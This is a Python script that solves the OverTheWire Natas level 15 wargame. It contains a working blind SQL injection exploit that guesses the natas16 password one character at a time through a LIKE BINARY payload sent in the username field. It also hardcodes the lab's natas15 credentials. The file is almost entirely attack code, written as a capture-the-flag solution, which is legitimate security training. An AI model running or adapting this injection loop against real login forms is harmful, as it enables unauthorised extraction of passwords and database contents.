#!/bin/python
import requests
import re
#from strings import *

brute="abcdefghijklmnopqrstuvwxyz"+"ABCDEFGHIJKLMNOPQRSTUVWXYZ"+"0123456789"
username= 'natas15'
password= 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://natas15.natas.labs.overthewire.org'
password2 = ""
session = requests.Session()

 #query = "SELECT * from users where username="natas16"";

while(True):
	for ch in brute :
		

		print "trying with password " + password2 + ch
 
		requests = session.post(url, data = {"username" : 'natas16" AND password LIKE BINARY "' + password2 + ch + "%" + ""   }, auth=(username,password))              
		content = requests.text
		
		if (content.find('user exists') != -1):
			password2=password2+ch
		
		if(len(password2) <= 33):
			print content
			print password2

		else :
			exit()
